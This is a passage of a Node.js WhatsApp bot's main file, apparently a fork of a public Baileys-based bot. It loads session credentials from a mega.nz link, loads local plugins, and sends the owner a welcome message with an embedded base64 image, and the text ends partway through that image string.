const {
  default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID, makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
  } = require('@whiskeysockets/baileys')
  
  
  const l = console.log
  const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
  const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
  const fs = require('fs')
  const ff = require('fluent-ffmpeg')
  const P = require('pino')
  const config = require('./config')
  const qrcode = require('qrcode-terminal')
  const StickersTypes = require('wa-sticker-formatter')
  const util = require('util')
  const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
  const FileType = require('file-type');
  const axios = require('axios')
  const { File } = require('megajs')
  const { fromBuffer } = require('file-type')
  const bodyparser = require('body-parser')
  const os = require('os')
  const Crypto = require('crypto')
  const path = require('path')
  const prefix = config.PREFIX
  
  const ownerNumber = ['254732297194']
  
  const tempDir = path.join(os.tmpdir(), 'cache-temp')
  if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir)
  }
  
  const clearTempDir = () => {
      fs.readdir(tempDir, (err, files) => {
          if (err) throw err;
          for (const file of files) {
              fs.unlink(path.join(tempDir, file), err => {
                  if (err) throw err;
              });
          }
      });
  }
  
  // Clear the temp directory every 5 minutes
  setInterval(clearTempDir, 5 * 60 * 1000);
  
  //===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
const sessdata = config.SESSION_ID.replace("POPKID~", '');
const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
filer.download((err, data) => {
if(err) throw err
fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
console.log("Session downloaded ✅")
})})}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;
  
  //=============================================
  
  async function connectToWA() {
  console.log("Connecting to WhatsApp ⏳️...");
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
  var { version } = await fetchLatestBaileysVersion()
  
  const conn = makeWASocket({
          logger: P({ level: 'silent' }),
          printQRInTerminal: false,
          browser: Browsers.macOS("Firefox"),
          syncFullHistory: true,
          auth: state,
          version
          })
      
  conn.ev.on('connection.update', (update) => {
  const { connection, lastDisconnect } = update
  if (connection === 'close') {
  if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
  connectToWA()
  }
  } else if (connection === 'open') {
  console.log('🧬 Installing Plugins')
  const path = require('path');
  fs.readdirSync("./plugins/").forEach((plugin) => {
  if (path.extname(plugin).toLowerCase() == ".js") {
  require("./plugins/" + plugin);
  }
  });
  console.log('Plugins installed successful ✅')
  console.log('Bot connected to whatsapp ✅')
  
  let up = `*✨ Hello, POPKID-XTECH Legend! ✨*

╭─〔 *🤖 POPKID-SAQ-TECH BOT* 〕  
├─▸ *Simplicity. Speed. Power. BY SAQIB.  
|    MWANGI!*  
╰─➤ *Your New WhatsApp Sidekick is Here!*

*❤️ Thank you for Choosing SAQIB-MD!*

╭──〔 🔗 *Quick Links* 〕  
├─ 📢 *Join Our Channel:*  
│   Click [**Here**](https://whatsapp.com/FFsSaR0wCSCB21jCZjEPJ) to join!  
├─ ⭐ *Give Us a Star:*  
│   Star Us [**Here**](https://github.com/megaind25)!  
╰─🛠️ *Prefix:* \`${prefix}\`

> _© MADE BY POPKID_`;
    conn.sendMessage(conn.user.id, { image: { url: `data:image/jpeg;base64,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